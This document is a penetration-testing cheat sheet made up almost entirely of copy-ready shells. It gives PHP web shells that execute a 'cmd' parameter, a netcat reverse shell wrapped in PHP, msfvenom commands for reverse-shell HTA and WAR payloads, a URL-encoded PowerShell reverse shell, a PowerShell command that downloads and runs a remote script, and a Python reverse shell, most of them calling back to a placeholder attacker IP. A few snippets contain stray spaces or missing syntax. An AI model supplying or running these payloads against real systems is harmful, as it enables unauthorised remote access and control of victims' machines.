###### ALL THE SHELLS
```
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?> 
```
```
<?php echo shell_exec($_GET['cmd']); ?> 
```
```
-Old NC shell-
<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 443 >/tmp/f");?>
```
```
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f hta-psh evil.hta
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ip LPORT=443 -f war > shell.war
```
## Powershell shells

### PowerShell Reverse Shell ( & and + symbols URLencoded )
```
powershell -c "%24client = New-Object System.Net.Sockets.TCPClient('<ipp>',<port>);%24stream = %24client.GetStream();[byte[]]%24bytes = 0..65535|%{0};while((%24i = %24stream.Read(%24bytes, 0, %24bytes.Length)) -ne 0){;%24data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString(%24bytes,0, %24i);%24sendback = (iex %24data 2>&1 | Out-String ); %24sendback2 = %24sendback %2B 'PS ' %2B (pwd).Path %2B '> ';%24sendbyte = ([text.encoding]::ASCII ).GetBytes(%24sendback2);%24stream.Write(%24sendbyte,0,%24sendbyte.Length);%24stream.Flush()};%24c lient.Close()"
```
Download a bindshell
```
'powershell "IEX(New-Object Net.WebClient).downloadString(\"http://IP:8000/shell.ps1\")"'
```
```
python -c socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

